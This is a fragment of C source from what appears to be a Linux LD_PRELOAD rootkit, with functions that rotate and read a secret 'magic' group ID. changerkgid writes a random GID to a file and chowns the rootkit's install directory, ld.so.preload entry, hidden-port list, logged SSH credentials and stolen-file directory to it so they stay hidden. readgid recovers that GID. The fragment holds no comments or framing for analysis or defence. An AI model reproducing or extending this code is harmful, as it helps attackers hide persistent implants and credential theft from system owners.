#ifdef READ_GID_FROM_FILE
int changerkgid(gid_t *new){
    hook(CFOPEN, COPENDIR, CREADDIR);

    gid_t newgid;

    srand(time(NULL));
    newgid = rand()%59999;
    while(newgid<10000) newgid = rand()%59999;

    // got new gid. need to write it to GID_PATH.
    char buf[8];
    FILE *fp;
    
    fp = call(CFOPEN, GID_PATH, "w");
    if(fp == NULL)
        return -1;

    snprintf(buf, sizeof(buf), "%d", newgid);
    fwrite(buf, 1, strlen(buf), fp);
    fclose(fp);

    // gid written.
    // now hide INSTALL_DIR, PRELOAD_FILE...
    chown_path(GID_PATH, newgid);
    chown_path(INSTALL_DIR, newgid);
    chown_path(LDSO_PRELOAD, newgid);
#ifdef HIDE_PORTS
    chown_path(HIDEPORTS, newgid);
#endif
#ifdef LOG_SSH
    chown_path(SSH_LOGS, newgid);
#endif
#ifdef FILE_STEAL
    chown_path(INTEREST_DIR, newgid);
#endif

    DIR *dp = call(COPENDIR, INSTALL_DIR);
    if(dp == NULL) return -1;

    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char tmp[strlen(INSTALL_DIR) + strlen(dir->d_name) + 3];
        snprintf(tmp, sizeof(tmp), "%s/%s", INSTALL_DIR, dir->d_name);
        chown_path(tmp, newgid);
    }
    closedir(dp);

    *new = newgid;
    return 0;
}
#endif


gid_t readgid(void){
#ifdef READ_GID_FROM_FILE
    FILE *fp;
    hook(CFOPEN);

    fp = call(CFOPEN, GID_PATH, "r");
    if(fp == NULL){
        return MAGIC_GID;
    }

    char gidbuf[8];
    fgets(gidbuf, 8, fp);
    if(gidbuf == NULL){
        fclose(fp);
        return MAGIC_GID;
    }
    fclose(fp);

    gid_t magicgid = atoi(gidbuf);
    if(!magicgid) return MAGIC_GID;
    return magicgid;
#else
    return MAGIC_GID;
#endif
}